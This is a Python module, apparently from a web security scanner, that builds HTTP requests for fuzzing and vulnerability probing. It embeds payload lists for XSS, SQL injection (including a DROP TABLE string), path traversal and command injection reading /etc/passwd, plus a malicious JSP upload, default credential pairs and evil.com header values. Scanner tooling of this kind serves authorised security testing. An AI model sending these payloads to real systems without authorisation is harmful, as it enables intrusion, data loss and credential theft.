"""
Request Generator for Active Spider Module
Generates intelligent HTTP requests for comprehensive spidering
galdr/interceptor/backend/modules/spider/utils/request_generator.py
"""

import random
import string
import itertools
from typing import Dict, List, Optional, Any, Iterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import logging

class SpiderRequestGenerator:
    """Generates intelligent requests for active spidering"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # Common parameter names for fuzzing
        self.common_params = [
            'id', 'user', 'page', 'action', 'cmd', 'exec', 'query', 'search',
            'file', 'path', 'dir', 'url', 'redirect', 'return', 'continue',
            'data', 'input', 'value', 'content', 'text', 'name', 'email'
        ]
        
        # Payload categories for different testing scenarios
        self.payloads = {
            'xss': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                'javascript:alert(1)',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>'
            ],
            'sql_injection': [
                "' OR '1'='1",
                '" OR "1"="1',
                '1; DROP TABLE users--',
                "1' UNION SELECT 1,2,3--",
                '1" UNION SELECT 1,2,3--'
            ],
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
            ],
            'command_injection': [
                '; cat /etc/passwd',
                '| whoami',
                '`id`',
                '$(whoami)',
                '&& dir'
            ],
            'fuzzing': [
                'A' * 100,
                '0' * 50,
                '\x00\x01\x02\x03',
                '%n%n%n%n',
                '<>&"\''
            ],
            'numeric': [
                '0', '1', '-1', '999999', '2147483647', '-2147483648',
                '1.0', '0.0', 'null', 'undefined'
            ]
        }
        
        # HTTP methods to test
        self.http_methods = [
            'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 
            'TRACE', 'CONNECT'
        ]
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
    
    def generate_parameter_fuzzing_requests(self, base_url: str, 
                                           discovered_params: List[str] = None) -> List[Dict]:
        """
        Generate requests for parameter fuzzing
        
        Args:
            base_url: Base URL to fuzz
            discovered_params: Known parameters to fuzz
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        # Use discovered parameters or common ones
        params_to_fuzz = discovered_params or self.common_params
        
        for param in params_to_fuzz:
            for payload_category, payloads in self.payloads.items():
                for payload in payloads[:3]:  # Limit to 3 payloads per category
                    request = {
                        'url': base_url,
                        'method': 'GET',
                        'params': {param: payload},
                        'headers': self._get_random_headers(),
                        'test_type': f'param_fuzzing_{payload_category}',
                        'payload': payload,
                        'target_param': param
                    }
                    requests.append(request)
        
        return requests
    
    def generate_path_fuzzing_requests(self, base_url: str, 
                                     wordlist: List[str] = None) -> List[Dict]:
        """
        Generate requests for path/directory fuzzing
        
        Args:
            base_url: Base URL to fuzz
            wordlist: Custom wordlist for fuzzing
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        # Default wordlist if none provided
        if not wordlist:
            wordlist = self._get_default_wordlist()
        
        parsed_url = urlparse(base_url)
        
        for path in wordlist:
            # Test different extensions
            extensions = ['', '.php', '.asp', '.aspx', '.jsp', '.html', '.txt', '.bak']
            
            for ext in extensions:
                full_path = f"{parsed_url.path.rstrip('/')}/{path}{ext}"
                
                fuzzed_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    full_path,
                    parsed_url.params,
                    parsed_url.query,
                    parsed_url.fragment
                ))
                
                request = {
                    'url': fuzzed_url,
                    'method': 'GET',
                    'headers': self._get_random_headers(),
                    'test_type': 'path_fuzzing',
                    'fuzzed_path': f"{path}{ext}"
                }
                requests.append(request)
        
        return requests
    
    def generate_method_testing_requests(self, url: str) -> List[Dict]:
        """
        Generate requests to test different HTTP methods
        
        Args:
            url: URL to test methods against
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        for method in self.http_methods:
            request = {
                'url': url,
                'method': method,
                'headers': self._get_random_headers(),
                'test_type': 'method_testing',
                'allow_redirects': False
            }
            
            # Add body for methods that typically have one
            if method in ['POST', 'PUT', 'PATCH']:
                request['data'] = {'test': 'data'}
            
            requests.append(request)
        
        return requests
    
    def generate_header_injection_requests(self, url: str) -> List[Dict]:
        """
        Generate requests to test header injection vulnerabilities
        
        Args:
            url: URL to test
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        # Headers to test for injection
        injection_headers = {
            'X-Forwarded-For': ['127.0.0.1', 'localhost', '192.168.1.1'],
            'X-Real-IP': ['127.0.0.1', 'localhost'],
            'X-Originating-IP': ['127.0.0.1'],
            'X-Remote-IP': ['127.0.0.1'],
            'X-Remote-Addr': ['127.0.0.1'],
            'User-Agent': ['<script>alert(1)</script>', '" OR 1=1--'],
            'Referer': ['javascript:alert(1)', 'http://evil.com'],
            'Host': ['evil.com', 'localhost:8080']
        }
        
        for header_name, values in injection_headers.items():
            for value in values:
                headers = self._get_random_headers()
                headers[header_name] = value
                
                request = {
                    'url': url,
                    'method': 'GET',
                    'headers': headers,
                    'test_type': 'header_injection',
                    'injected_header': header_name,
                    'injected_value': value
                }
                requests.append(request)
        
        return requests
    
    def generate_file_upload_requests(self, upload_url: str, 
                                    file_param: str = 'file') -> List[Dict]:
        """
        Generate requests for file upload testing
        
        Args:
            upload_url: URL that accepts file uploads
            file_param: Parameter name for file upload
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        # Test files with different content and extensions
        test_files = [
            {
                'filename': 'test.txt',
                'content': 'Normal text file content',
                'content_type': 'text/plain'
            },
            {
                'filename': 'test.php',
                'content': '<?php phpinfo(); ?>',
                'content_type': 'application/x-php'
            },
            {
                'filename': 'test.jsp',
                'content': '<% Runtime.getRuntime().exec("id"); %>',
                'content_type': 'application/x-jsp'
            },
            {
                'filename': 'test.asp',
                'content': '<% Response.Write("ASP Test") %>',
                'content_type': 'application/x-asp'
            },
            {
                'filename': 'test.gif',
                'content': 'GIF89a<?php phpinfo(); ?>',
                'content_type': 'image/gif'
            },
            {
                'filename': '../../../test.txt',
                'content': 'Path traversal test',
                'content_type': 'text/plain'
            }
        ]
        
        for test_file in test_files:
            request = {
                'url': upload_url,
                'method': 'POST',
                'headers': self._get_random_headers(),
                'files': {
                    file_param: (
                        test_file['filename'],
                        test_file['content'],
                        test_file['content_type']
                    )
                },
                'test_type': 'file_upload',
                'test_filename': test_file['filename']
            }
            requests.append(request)
        
        return requests
    
    def generate_authentication_bypass_requests(self, url: str) -> List[Dict]:
        """
        Generate requests to test authentication bypass techniques
        
        Args:
            url: URL to test
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        # SQL injection payloads for auth bypass
        sql_payloads = [
            "admin' --",
            "admin' /*",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "') OR ('1'='1' --",
            "admin'/**/OR/**/1=1--"
        ]
        
        # Common username/password combinations
        auth_combos = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
            ('guest', 'guest')
        ]
        
        # Test SQL injection in login
        for payload in sql_payloads:
            request = {
                'url': url,
                'method': 'POST',
                'headers': self._get_random_headers(),
                'data': {
                    'username': payload,
                    'password': 'password'
                },
                'test_type': 'auth_bypass_sql',
                'payload': payload
            }
            requests.append(request)
        
        # Test common credentials
        for username, password in auth_combos:
            request = {
                'url': url,
                'method': 'POST',
                'headers': self._get_random_headers(),
                'data': {
                    'username': username,
                    'password': password
                },
                'test_type': 'auth_bypass_creds',
                'credentials': f"{username}:{password}"
            }
            requests.append(request)
        
        return requests
    
    def generate_csrf_testing_requests(self, url: str, 
                                     form_data: Dict[str, str]) -> List[Dict]:
        """
        Generate requests to test CSRF protection
        
        Args:
            url: URL with form
            form_data: Form data to submit
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        # Test without CSRF token
        request_no_token = {
            'url': url,
            'method': 'POST',
            'headers': self._get_random_headers(),
            'data': {k: v for k, v in form_data.items() 
                    if not any(token in k.lower() for token in ['csrf', 'token', '_token'])},
            'test_type': 'csrf_no_token'
        }
        requests.append(request_no_token)
        
        # Test with invalid CSRF token
        invalid_token_data = form_data.copy()
        for key in invalid_token_data:
            if any(token in key.lower() for token in ['csrf', 'token', '_token']):
                invalid_token_data[key] = 'invalid_token_123'
        
        request_invalid_token = {
            'url': url,
            'method': 'POST',
            'headers': self._get_random_headers(),
            'data': invalid_token_data,
            'test_type': 'csrf_invalid_token'
        }
        requests.append(request_invalid_token)
        
        # Test with different referer
        headers_no_referer = self._get_random_headers()
        headers_no_referer['Referer'] = 'http://evil.com'
        
        request_wrong_referer = {
            'url': url,
            'method': 'POST',
            'headers': headers_no_referer,
            'data': form_data,
            'test_type': 'csrf_wrong_referer'
        }
        requests.append(request_wrong_referer)
        
        return requests
    
    def generate_rate_limiting_requests(self, url: str, count: int = 100) -> List[Dict]:
        """
        Generate requests for rate limiting testing
        
        Args:
            url: URL to test
            count: Number of requests to generate
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        for i in range(count):
            request = {
                'url': url,
                'method': 'GET',
                'headers': self._get_random_headers(),
                'test_type': 'rate_limiting',
                'request_number': i + 1,
                'allow_redirects': False
            }
            requests.append(request)
        
        return requests
    
    def generate_session_testing_requests(self, url: str, 
                                        session_cookies: Dict[str, str]) -> List[Dict]:
        """
        Generate requests for session security testing
        
        Args:
            url: URL to test
            session_cookies: Current session cookies
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        # Test with no session
        request_no_session = {
            'url': url,
            'method': 'GET',
            'headers': self._get_random_headers(),
            'test_type': 'session_no_cookies'
        }
        requests.append(request_no_session)
        
        # Test with modified session
        for cookie_name, cookie_value in session_cookies.items():
            modified_cookies = session_cookies.copy()
            
            # Try different session modifications
            modifications = [
                cookie_value + '1',  # Append character
                cookie_value[:-1],   # Remove last character
                'invalid_session',   # Completely invalid
                cookie_value.upper() if cookie_value.islower() else cookie_value.lower()  # Case change
            ]
            
            for modified_value in modifications:
                modified_cookies[cookie_name] = modified_value
                
                request = {
                    'url': url,
                    'method': 'GET',
                    'headers': self._get_random_headers(),
                    'cookies': modified_cookies,
                    'test_type': 'session_modified',
                    'modified_cookie': cookie_name,
                    'modification': modified_value
                }
                requests.append(request)
        
        return requests
    
    def generate_api_testing_requests(self, api_url: str, 
                                    discovered_endpoints: List[str] = None) -> List[Dict]:
        """
        Generate requests for API testing
        
        Args:
            api_url: Base API URL
            discovered_endpoints: Known API endpoints
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        # Common API endpoints to test
        common_endpoints = [
            '/users', '/user', '/admin', '/config', '/status', '/health',
            '/api/v1/users', '/api/v2/users', '/v1/users', '/v2/users',
            '/swagger.json', '/openapi.json', '/api-docs', '/docs'
        ]
        
        endpoints_to_test = discovered_endpoints or common_endpoints
        
        for endpoint in endpoints_to_test:
            full_url = f"{api_url.rstrip('/')}{endpoint}"
            
            # Test different methods
            for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
                request = {
                    'url': full_url,
                    'method': method,
                    'headers': self._get_api_headers(),
                    'test_type': 'api_testing',
                    'endpoint': endpoint
                }
                
                # Add JSON body for POST/PUT/PATCH
                if method in ['POST', 'PUT', 'PATCH']:
                    request['json'] = {'test': 'data', 'id': 1}
                
                requests.append(request)
        
        return requests
    
    def _get_random_headers(self) -> Dict[str, str]:
        """Get randomized HTTP headers"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Randomly add some optional headers
        if random.random() > 0.5:
            headers['DNT'] = '1'
        
        if random.random() > 0.7:
            headers['Cache-Control'] = 'no-cache'
        
        return headers
    
    def _get_api_headers(self) -> Dict[str, str]:
        """Get headers suitable for API testing"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'application/json, */*',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate'
        }
    
    def _get_default_wordlist(self) -> List[str]:
        """Get default wordlist for path fuzzing"""
        return [
            'admin', 'administrator', 'login', 'dashboard', 'panel',
            'config', 'configuration', 'settings', 'setup', 'install',
            'backup', 'backups', 'files', 'uploads', 'images',
            'api', 'v1', 'v2', 'docs', 'documentation', 'swagger',
            'test', 'testing', 'debug', 'dev', 'development',
            'tmp', 'temp', 'cache', 'logs', 'log', 'private',
            'secure', 'protected', 'restricted', 'internal'
        ]
    
    def generate_custom_payload_requests(self, url: str, 
                                       custom_payloads: Dict[str, List[str]]) -> List[Dict]:
        """
        Generate requests with custom payloads
        
        Args:
            url: URL to test
            custom_payloads: Dictionary of payload categories and values
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        for category, payloads in custom_payloads.items():
            for payload in payloads:
                # Test in URL parameter
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params['test'] = [payload]
                
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                
                request = {
                    'url': test_url,
                    'method': 'GET',
                    'headers': self._get_random_headers(),
                    'test_type': f'custom_{category}',
                    'payload': payload
                }
                requests.append(request)
                
                # Test in POST body
                post_request = {
                    'url': url,
                    'method': 'POST',
                    'headers': self._get_random_headers(),
                    'data': {'test': payload},
                    'test_type': f'custom_{category}_post',
                    'payload': payload
                }
                requests.append(post_request)
        
        return requests
    
    def generate_random_fuzzing_requests(self, url: str, count: int = 50) -> List[Dict]:
        """
        Generate random fuzzing requests
        
        Args:
            url: URL to fuzz
            count: Number of random requests to generate
            
        Returns:
            List of request dictionaries
        """
        requests = []
        
        for i in range(count):
            # Generate random parameter name and value
            param_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
            param_value = self._generate_random_payload()
            
            request = {
                'url': url,
                'method': random.choice(['GET', 'POST']),
                'headers': self._get_random_headers(),
                'test_type': 'random_fuzzing'
            }
            
            if request['method'] == 'GET':
                request['params'] = {param_name: param_value}
            else:
                request['data'] = {param_name: param_value}
            
            requests.append(request)
        
        return requests
    
    def _generate_random_payload(self) -> str:
        """Generate a random payload for fuzzing"""
        payload_types = [
            lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1, 100))),
            lambda: ''.join(random.choices(string.punctuation, k=random.randint(1, 20))),
            lambda: str(random.randint(-2147483648, 2147483647)),
            lambda: random.choice(['true', 'false', 'null', 'undefined']),
            lambda: '<script>alert(' + str(random.randint(1, 999)) + ')</script>',
            lambda: '\x00' * random.randint(1, 10),
            lambda: 'A' * random.randint(100, 1000)
        ]
        
        return random.choice(payload_types)()
